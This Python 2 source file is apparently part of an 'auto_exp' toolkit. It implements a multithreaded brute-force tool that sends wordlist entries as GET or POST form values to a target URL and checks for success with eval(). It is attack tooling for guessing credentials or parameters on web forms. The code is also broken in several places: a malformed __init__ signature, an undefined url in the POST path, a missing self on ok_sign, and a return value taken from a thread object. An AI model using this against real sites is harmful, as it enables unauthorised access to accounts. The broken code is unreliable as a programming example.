import requests
import threading
import Queue
from auto_exp.lib.core.file import IO_File


class Worker(threading.Thread):

    ret = ""

    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):
        while True:
            if self.queue.empty():
                break
            data = self.queue.get_nowait()
            if data["Method"] == "GET":
                url = data["URL"] + "?" + data["Form_Name"] + \
                    "=" + data["Form_Value"]
                r = requests.get(url=url)
                self.ret = r
            else:
                if data["Method"] == "POST":
                    data = {
                        data["Form_Name"]: data["Form_Value"]
                    }
                    r = requests.post(url, data=data)
                    self.ret = r


class BruteForce:

    def __init__(url, method="GET", form_name, dic_path, thread_count, ok_sign):
        self.url = url
        self.method = method
        self.form_name = form_name
        self.dic_path = dic_path
        self.IO = IO_File()
        self.thread_count = thread_count
        self.ok_sign = ok_sign

    def start(self):
        queue = Queue.Queue()
        for i in self.IO.read(self.dic_path):
            dic = {
                "URL": self.url,
                "Method": self.method,
                "Form_Name": self.form_name,
                "Form_Value": i,
            }
            queue.put(dic)
        threads = []
        for i in xrange(int(self.thread_count)):
            threads.append(Worker(queue))

        for t in threads:
            t.start()

        for t in threads:
            t.join()

        ret = Worker.ret
        del Worker.ret

        if eval(ok_sign):
            return t.text

if __name__ == '__main__':
    pass
